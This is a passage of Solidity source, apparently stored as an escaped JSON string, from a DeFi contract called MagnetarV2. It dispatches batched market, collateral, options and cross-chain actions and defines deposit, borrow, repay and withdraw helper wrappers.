)\n                );\n            } else if (_action.id == MARKET_REMOVE_ASSET) {\n                HelperMarketRemoveAndRepayAsset memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperMarketRemoveAndRepayAsset)\n                );\n\n                _executeModule(\n                    Module.Market,\n                    abi.encodeWithSelector(\n                        MagnetarMarketModule\n                            .exitPositionAndRemoveCollateral\n                            .selector,\n                        data.user,\n                        data.externalData,\n                        data.removeAndRepayData\n                    )\n                );\n            } else if (_action.id == MARKET_DEPOSIT_REPAY_REMOVE_COLLATERAL) {\n                HelperDepositRepayRemoveCollateral memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperDepositRepayRemoveCollateral)\n                );\n\n                _executeModule(\n                    Module.Market,\n                    abi.encodeWithSelector(\n                        MagnetarMarketModule\n                            .depositRepayAndRemoveCollateralFromMarket\n                            .selector,\n                        data.market,\n                        data.user,\n                        data.depositAmount,\n                        data.repayAmount,\n                        data.collateralAmount,\n                        data.extractFromSender,\n                        data.withdrawCollateralParams\n                    )\n                );\n            } else if (_action.id == MARKET_BUY_COLLATERAL) {\n                HelperBuyCollateral memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperBuyCollateral)\n                );\n\n                IMarket(data.market).buyCollateral(\n                    data.from,\n                    data.borrowAmount,\n                    data.supplyAmount,\n                    data.minAmountOut,\n                    address(data.swapper),\n                    data.dexData\n                );\n            } else if (_action.id == MARKET_SELL_COLLATERAL) {\n                HelperSellCollateral memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperSellCollateral)\n                );\n\n                IMarket(data.market).sellCollateral(\n                    data.from,\n                    data.share,\n                    data.minAmountOut,\n                    address(data.swapper),\n                    data.dexData\n                );\n            } else if (_action.id == TAP_EXERCISE_OPTION) {\n                HelperExerciseOption memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperExerciseOption)\n                );\n\n                ITapiocaOptionsBrokerCrossChain(_action.target).exerciseOption(\n                    data.optionsData,\n                    data.lzData,\n                    data.tapSendData,\n                    data.approvals\n                );\n            } else if (_action.id == MARKET_MULTIHOP_BUY) {\n                HelperMultiHopBuy memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperMultiHopBuy)\n                );\n\n                IUSDOBase(_action.target).initMultiHopBuy(\n                    data.from,\n                    data.collateralAmount,\n                    data.borrowAmount,\n                    data.swapData,\n                    data.lzData,\n                    data.externalData,\n                    data.airdropAdapterParams,\n                    data.approvals\n                );\n            } else if (_action.id == MARKET_MULTIHOP_BUY) {\n                HelperMultiHopBuy memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperMultiHopBuy)\n                );\n\n                IUSDOBase(_action.target).initMultiHopBuy(\n                    data.from,\n                    data.collateralAmount,\n                    data.borrowAmount,\n                    data.swapData,\n                    data.lzData,\n                    data.externalData,\n                    data.airdropAdapterParams,\n                    data.approvals\n                );\n            } else if (_action.id == TOFT_REMOVE_AND_REPAY) {\n                HelperTOFTRemoveAndRepayAsset memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperTOFTRemoveAndRepayAsset)\n                );\n\n                IUSDOBase(_action.target).removeAsset(\n                    data.from,\n                    data.to,\n                    data.lzDstChainId,\n                    data.zroPaymentAddress,\n                    data.adapterParams,\n                    data.externalData,\n                    data.removeAndRepayData,\n                    data.approvals\n                );\n            } else {\n                revert(\"MagnetarV2: action not valid\");\n            }\n        }\n\n        require(msg.value == valAccumulator, \"MagnetarV2: value mismatch\");\n    }\n\n    /// @notice performs a withdraw operation\n    /// @dev it can withdraw on the current chain or it can send it to another one\n    ///     - if `dstChainId` is 0 performs a same-chain withdrawal\n    ///          - all parameters except `yieldBox`, `from`, `assetId` and `amount` or `share` are ignored\n    ///     - if `dstChainId` is NOT 0, the method requires gas for the `sendFrom` operation\n    /// @param yieldBox the YieldBox address\n    /// @param from user to withdraw from\n    /// @param assetId the YieldBox asset id to withdraw\n    /// @param dstChainId LZ chain id to withdraw to\n    /// @param receiver the receiver on the destination chain\n    /// @param amount the amount to withdraw\n    /// @param share the share to withdraw\n    /// @param adapterParams LZ adapter params\n    /// @param refundAddress the LZ refund address which receives the gas not used in the process\n    /// @param gas the amount of gas to use for sending the asset to another layer\n    function withdrawToChain(\n        IYieldBoxBase yieldBox,\n        address from,\n        uint256 assetId,\n        uint16 dstChainId,\n        bytes32 receiver,\n        uint256 amount,\n        uint256 share,\n        bytes memory adapterParams,\n        address payable refundAddress,\n        uint256 gas\n    ) external payable {\n        _executeModule(\n            Module.Market,\n            abi.encodeWithSelector(\n                MagnetarMarketModule.withdrawToChain.selector,\n                yieldBox,\n                from,\n                assetId,\n                dstChainId,\n                receiver,\n                amount,\n                share,\n                adapterParams,\n                refundAddress,\n                gas\n            )\n        );\n    }\n\n    /// @notice helper for deposit to YieldBox, add collateral to a market, borrom from the same market and withdraw\n    /// @dev all operations are optional:\n    ///         - if `deposit` is false it will skip the deposit to YieldBox step\n    ///         - if `withdraw` is false it will skip the withdraw step\n    ///         - if `collateralAmount == 0` it will skip the add collateral step\n    ///         - if `borrowAmount == 0` it will skip the borrow step\n    ///     - the amount deposited to YieldBox is `collateralAmount`\n    /// @param market the SGL/BigBang market\n    /// @param user the user to perform the action for\n    /// @param collateralAmount the collateral amount to add\n    /// @param borrowAmount the borrow amount\n    /// @param extractFromSender extracts collateral tokens from sender or from the user\n    /// @param deposit true/false flag for the deposit to YieldBox step\n    /// @param withdrawParams necessary data for the same chain or the cross-chain withdrawal\n    function depositAddCollateralAndBorrowFromMarket(\n        IMarket market,\n        address user,\n        uint256 collateralAmount,\n        uint256 borrowAmount,\n        bool extractFromSender,\n        bool deposit,\n        ICommonData.IWithdrawParams calldata withdrawParams\n    ) external payable {\n        _executeModule(\n            Module.Market,\n            abi.encodeWithSelector(\n                MagnetarMarketModule\n                    .depositAddCollateralAndBorrowFromMarket\n                    .selector,\n                market,\n                user,\n                collateralAmount,\n                borrowAmount,\n                extractFromSender,\n                deposit,\n                withdrawParams\n            )\n        );\n    }\n\n    /// @notice helper for deposit asset to YieldBox, repay on a market, remove collateral and withdraw\n    /// @dev all steps are optional:\n    ///         - if `depositAmount` is 0, the deposit to YieldBox step is skipped\n    ///         - if `repayAmount` is 0, the repay step is skipped\n    ///         - if `collateralAmount` is 0, the add collateral step is skipped\n    /// @param market the SGL/BigBang market\n    /// @param user the user to perform the action for\n    /// @param depositAmount the amount to deposit to YieldBox\n    /// @param repayAmount the amount to repay to the market\n    /// @param collateralAmount the amount to withdraw from the market\n    /// @param extractFromSender extracts collateral tokens from sender or from the user\n    /// @param withdrawCollateralParams withdraw specific params\n    function depositRepayAndRemoveCollateralFromMarket(\n        address market,\n        address user,\n        uint256 depositAmount,\n        uint256 repayAmount,\n        uint256 collateralAmount,\n        bool extractFromSender,\n        ICommonData.IWithdrawParams calldata withdrawCollateralParams\n    ) external payable {\n        _executeModule(\n            Module.Market,\n            abi.encodeWithSelector(\n                MagnetarMarketModule\n                    .depositRepayAndRemoveCollateralFromMarket\n                    .selector,\n                market,\n                user,\n                depositAmount,\n                repayAmount,\n                collateralAmount,\n                extractFromSender,\n                withdrawCollateralParams\n            )\n        );\n    }\n\n    /// @notice helper to deposit mint from BB, lend on SGL, lock on tOLP and participate on tOB\n    /// @dev all steps are optional:\n    ///         - if `mintData.mint` is false, the mint operation on BB is skipped\n    ///             - add BB collateral to YB, add collateral on BB and borrow from BB are part of the mint operation\n    ///         - if `depositData.deposit` is false, the asset deposit to YB is skipped\n    ///         - if `lendAmount == 0` the addAsset operation on SGL is skipped\n    ///             - if `mintData.mint` is tru"
    }
  ]
}